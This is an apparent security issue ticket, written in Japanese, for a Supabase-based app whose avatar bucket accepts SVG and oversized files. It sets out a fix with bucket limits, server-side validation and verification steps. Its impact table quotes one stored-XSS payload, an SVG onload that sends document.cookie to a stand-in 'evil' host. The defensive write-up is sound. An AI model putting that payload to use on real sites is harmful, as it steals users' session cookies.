# Issue #008: avatars バケットで SVG 等の実行可能形式のアップロードが許可されている

**作成日**: 2026-04-20
**優先度**: Low
**ステータス**: Open
**カテゴリ**: Security (File Upload)

---

## 問題の概要

`avatars` バケットと `storage.uploadAvatar` Action が **MIME タイプ・ファイルサイズの制限をサーバ側で一切指定していない**。Supabase Storage は `upload()` API に渡された Content-Type をそのまま保存するため、`<script>` を埋め込んだ SVG や、極端に大きなファイルを受け付けてしまう。

### 該当箇所

#### バケット設定 [supabase/migrations/001_init.sql:96-98](../../supabase/migrations/001_init.sql#L96-L98)

```sql
insert into storage.buckets (id, name, public)
values ('avatars', 'avatars', false)
on conflict (id) do nothing;
-- ↑ allowed_mime_types / file_size_limit カラムが未設定（NULL = 無制限）
```

#### アップロード Action [src/actions/index.ts:137-167](../../src/actions/index.ts#L137-L167)

```ts
uploadAvatar: defineAction({
  accept: "form",
  input: z.object({
    file: z.instanceof(File),     // ← サイズ / MIME 検証なし
  }),
  handler: async (input, context) => {
    // ...
    const { error } = await supabase.storage
      .from("avatars")
      .upload(filePath, input.file, { upsert: true });
    // ↑ contentType 未指定 → file.type をそのまま使う
  },
}),
```

#### クライアント側検証のみ [src/components/ProfileForm.vue:33-43](../../src/components/ProfileForm.vue#L33-L43)

```ts
if (file.size > 5 * 1024 * 1024) { /* ... */ }
if (!file.type.startsWith("image/")) { /* ... */ }
```

クライアント側検証は **DevTools で自明に迂回可能**。Supabase Storage の公式ガイドは「Upload restrictions like max file size and allowed content types are defined at the bucket level」と明記しており、**バケット設定で制限を掛けるのが正**。

---

## 影響

| リスク                           | 詳細                                                                                                                                                     |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Stored XSS on `*.supabase.co`    | `<svg onload="fetch('//evil/?'+document.cookie)">` をアップロード。被害者が署名付き URL を **直接開く** と `<supabase ref>.supabase.co` オリジンで JS 実行。自サイト Cookie は別オリジンなので直接は盗まれないが、**Supabase Auth の他機能（例: Storage Public 公開設定が混在）と組み合わさると影響が拡大**。また社内調査員がリンクを踏んだ際の社会的影響もある |
| ストレージ容量の枯渇             | 数百 MB の動画ファイルを連続アップロードでバケット逼迫。Supabase 無料枠は 1GB、Pro プランでも従量課金                                                     |
| 偽装ファイルによる攻撃           | `malware.exe` に `.png` 拡張子を付けてアップロード、他ユーザーがダウンロードさせられる（ただし本テンプレートは自分しか見えない RLS のため影響は限定的）  |
| 容量ベースの DoS                 | 制限なしのため、1 ユーザーが数 GB 書き込んでプロジェクト全体の利用料を跳ね上げる                                                                         |

---

## 解決策

### 方針

1. **バケット設定（DB）**: `storage.buckets.allowed_mime_types` と `file_size_limit` を SQL で設定（単一の真実の源）
2. **Action（サーバ）**: Zod `.refine` で File の `type` / `size` を検証し、バケットのバリデーションより前に 400 で早期 return（エラーメッセージの UX 向上）
3. **upload API 呼び出し**: `contentType` を明示指定し、クライアントが送ってきた `file.type` を盲信しない

### 実装タスク

#### 1. マイグレーション: `supabase/migrations/005_avatar_bucket_restrictions.sql`

```sql
-- ========================================
-- Phase 2: avatars バケットの MIME/サイズ制限
-- ========================================
--
-- Supabase Storage は バケットレベルで allowed_mime_types と file_size_limit を
-- 定義できる (storage.buckets テーブル)。NULL のままだと無制限なので、
-- SVG を含むベクター / 実行可能形式を拒否し、5MB 上限を掛ける。

update storage.buckets
   set allowed_mime_types = array[
         'image/png',
         'image/jpeg',
         'image/webp',
         'image/gif'
       ],
       file_size_limit = 5 * 1024 * 1024  -- 5 MB (bytes)
 where id = 'avatars';

-- 既存のファイルで制限外のものがあれば、ログに出して把握する
-- （削除は手動対応。運用開始直後なら空のはず）
do $$
declare
  violation_count int;
begin
  select count(*) into violation_count
    from storage.objects
   where bucket_id = 'avatars'
     and (
       metadata->>'size' is null
       or (metadata->>'size')::bigint > 5 * 1024 * 1024
     );
  if violation_count > 0 then
    raise notice 'avatars bucket has % oversized objects; please review manually', violation_count;
  end if;
end $$;
```

> `image/svg+xml` を **あえて除外** している点が本 issue の核心。SVG は XML+JS 実行コンテナなので画像扱いしない。

#### 2. Action 側の早期検証

**[src/actions/index.ts](../../src/actions/index.ts)**

```ts
const ALLOWED_AVATAR_MIME = new Set([
  "image/png",
  "image/jpeg",
  "image/webp",
  "image/gif",
]);
const MAX_AVATAR_SIZE = 5 * 1024 * 1024; // 5 MB

uploadAvatar: defineAction({
  accept: "form",
  input: z.object({
    file: z
      .instanceof(File)
      .refine((f) => f.size > 0 && f.size <= MAX_AVATAR_SIZE, {
        message: "ファイルサイズは5MB以下にしてください",
      })
      .refine((f) => ALLOWED_AVATAR_MIME.has(f.type), {
        message: "PNG / JPEG / WebP / GIF のみアップロード可能です",
      }),
  }),
  handler: async (input, context) => {
    const supabase = createClient({
      request: context.request,
      cookies: context.cookies,
    });
    const {
      data: { user },
    } = await supabase.auth.getUser();
    if (!user) throw new ActionError({ code: "UNAUTHORIZED" });

    // ファイル名をサニタイズ（パストラバーサル攻撃対策）
    // Issue #001 の Unicode 対応とは別軸で、危険文字のみ除外する方針
    const sanitizedFileName = input.file.name.replace(
      /[\/\\:*?"<>|]/g,
      "_",
    ).replace(/\.\./g, "_");
    const filePath = `${user.id}/${Date.now()}_${sanitizedFileName}`;

    const { error } = await supabase.storage
      .from("avatars")
      .upload(filePath, input.file, {
        upsert: true,
        contentType: input.file.type, // 検証済み MIME を明示
      });

    if (error) {
      throw new ActionError({
        code: "INTERNAL_SERVER_ERROR",
        message: error.message,
      });
    }

    const { error: updateError } = await supabase
      .from("profiles")
      .update({ avatar_url: filePath })
      .eq("user_id", user.id);
    if (updateError) {
      throw new ActionError({
        code: "INTERNAL_SERVER_ERROR",
        message: updateError.message,
      });
    }

    return { path: filePath };
  },
}),
```

#### 3. フロント側の UX 向上（必須ではない）

**[src/components/ProfileForm.vue](../../src/components/ProfileForm.vue)**

```ts
const ALLOWED_MIME = ["image/png", "image/jpeg", "image/webp", "image/gif"];

// handleAvatarChange 内
if (!ALLOWED_MIME.includes(file.type)) {
  error.value = "PNG / JPEG / WebP / GIF のみアップロード可能です";
  return;
}
```

`<input accept="image/png,image/jpeg,image/webp,image/gif">` も同期させる。

#### 4. 検証手順

```bash
# SVG（拒否されるべき）
curl -F "file=@xss.svg;type=image/svg+xml" ... /_actions/storage.uploadAvatar
# → 400 "PNG / JPEG / WebP / GIF のみアップロード可能です"

# 5MB 超の PNG（拒否されるべき）
dd if=/dev/urandom of=big.png bs=1m count=6
curl -F "file=@big.png" ... /_actions/storage.uploadAvatar
# → 400 "ファイルサイズは5MB以下にしてください"

# 通常の PNG（許可されるべき）
curl -F "file=@ok.png" ... /_actions/storage.uploadAvatar
# → 200
```

#### 5. 既存データの棚卸し（運用）

SQL Editor で:

```sql
select id, name, owner, metadata->>'mimetype' as mime, metadata->>'size' as size
  from storage.objects
 where bucket_id = 'avatars'
   and metadata->>'mimetype' not in ('image/png','image/jpeg','image/webp','image/gif');
```

該当があれば運用判断で削除。

#### 6. `.claude/security.md` にベストプラクティス追記

```markdown
## ファイルアップロードのガイドライン

- **バケット単位で `allowed_mime_types` と `file_size_limit` を必ず設定する**
- **`image/svg+xml` は許可しない**（XML + JS 実行コンテナのため Stored XSS リスク）
- クライアント側検証は UX 向け、**サーバ / DB 側の制限が真の防衛線**
- `upload()` の `contentType` を明示指定して、クライアントが送る Content-Type を盲信しない
```

---

## 受け入れ基準

- [ ] SVG (`image/svg+xml`) のアップロードが **400** で拒否される
- [ ] 5MB 超のファイルが **400** で拒否される
- [ ] PNG / JPEG / WebP / GIF は従来通りアップロードできる
- [ ] Supabase Dashboard → Storage → avatars → Settings で `Allowed MIME types` / `File size limit` が設定済みになっている
- [ ] `storage.buckets` テーブルを SQL で確認し `allowed_mime_types` が 4 種類に限定されている
- [ ] 既存の avatars にポリシー違反ファイルがないことを棚卸しクエリで確認
- [ ] typecheck / lint / test pass

---

## 参考資料

- [Supabase Storage: Creating Buckets](https://supabase.com/docs/guides/storage/buckets/creating-buckets)
- [Supabase Storage: Standard Uploads](https://supabase.com/docs/guides/storage/uploads/standard-uploads)
- [Supabase Storage: Fundamentals](https://supabase.com/docs/guides/storage/buckets/fundamentals)（"Upload restrictions ... defined at the bucket level"）
- [OWASP: File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [MDN: SVG can contain scripts](https://developer.mozilla.org/en-US/docs/Web/SVG/SVG_as_an_Image#restrictions)

---

## ラベル

`security`, `file-upload`, `storage`, `xss`, `low-priority`
